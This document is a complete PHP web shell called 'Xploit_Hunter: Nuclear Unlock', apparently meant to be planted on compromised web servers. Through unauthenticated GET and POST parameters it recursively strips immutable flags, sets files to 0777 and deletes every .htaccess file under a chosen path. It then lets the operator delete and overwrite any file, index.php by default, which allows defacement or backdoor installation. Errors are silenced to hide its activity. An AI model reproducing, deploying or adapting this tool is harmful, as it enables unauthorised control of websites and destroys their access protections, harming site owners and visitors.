<?php
/**
 * --- Xploit_Hunter: Total Purge & Force Edition ---
 **/
error_reporting(0);
header('Content-Type: text/html; charset=UTF-8');

$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = str_replace('\\','/',$path);

// --- 1. FULL SYSTEM PURGE (Recursive Unlock) ---
if(isset($_GET['purge_all'])){
    echo "<div style='background:#111; color:lime; padding:10px; border:1px solid #ff2bd4;'>";
    
    // Recursive iterator to find every .htaccess and locked file
    $dir_iterator = new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS);
    $iterator = new RecursiveIteratorIterator($dir_iterator, RecursiveIteratorIterator::CHILD_FIRST);

    foreach ($iterator as $file) {
        $filename = $file->getFilename();
        $full_path = $file->getRealPath();

        // Remove immutable flags and set perms via shell if possible
        @shell_exec("chattr -i " . escapeshellarg($full_path));
        @chmod($full_path, 0777);

        // Targeted deletion of .htaccess
        if ($filename === '.htaccess') {
            if(@unlink($full_path)) echo "Purged: $full_path <br>";
        }
    }
    echo "Purge Complete. Restrictions lifted.</div>";
}

// --- 2. ATOMIC FORCE WRITE ---
if(isset($_POST['nuclear_save'])){
    $target = $_POST['path_target'];
    $content = $_POST['src_content'];

    // Aggressive unlocking sequence
    @shell_exec("chattr -i " . escapeshellarg($target));
    @chmod($target, 0777);
    @unlink($target); // Delete the old file entirely to break the OS lock

    // Recreate fresh
    if(@file_put_contents($target, $content) !== false){
        $res = ["success", "FORCE WRITE SUCCESSFUL: File Recreated"];
    } else {
        // Final fallback: Stream write
        $fp = @fopen($target, 'w');
        if($fp){
            @fwrite($fp, $content);
            @fclose($fp);
            $res = ["success", "STREAM FORCE SUCCESSFUL"];
        } else {
            $res = ["error", "HARD LOCK: Directory permissions are owned by Root"];
        }
    }
}
?>

<!DOCTYPE HTML>
<html>
<head>
    <style>
        body { background: #0a0a0f; color: #00ffe7; font-family: monospace; }
        .btn-purge { background: #ff0000; color: white; padding: 15px; text-decoration: none; font-weight: bold; display: inline-block; margin: 10px; border: 2px solid white; }
        .editor-box { border: 2px solid #ff2bd4; padding: 20px; background: #1a1a2e; margin-top: 20px; }
        textarea { width: 100%; height: 400px; background: #000; color: #0f0; border: 1px solid #ff2bd4; }
        .msg { font-weight: bold; padding: 10px; text-align: center; }
        .success { color: lime; } .error { color: red; }
    </style>
</head>
<body>
    <center>
        <h1>XPLOIT_HUNTER: NUCLEAR UNLOCK</h1>
        <a href="?path=<?php echo urlencode($path); ?>&purge_all=true" class="btn-purge">FORCE PURGE ALL .HTACCESS</a>
    </center>

    <div class="container">
        <?php if($res) echo "<div class='msg {$res[0]}'>{$res[1]}</div>"; ?>

        <div class="editor-box">
            <form method="POST">
                <p>Target Path: <input type="text" name="path_target" value="<?php echo $path; ?>/index.php" style="width:70%; background:#111; color:#0f0; border:1px solid #444;"></p>
                <textarea name="src_content"><?php echo htmlspecialchars($_POST['src_content']); ?></textarea>
                <br><br>
                <input type="submit" name="nuclear_save" value="EXECUTE ATOMIC OVERWRITE" style="width:100%; padding:15px; background:lime; font-weight:bold; cursor:pointer;">
            </form>
        </div>
    </div>
</body>
</html>
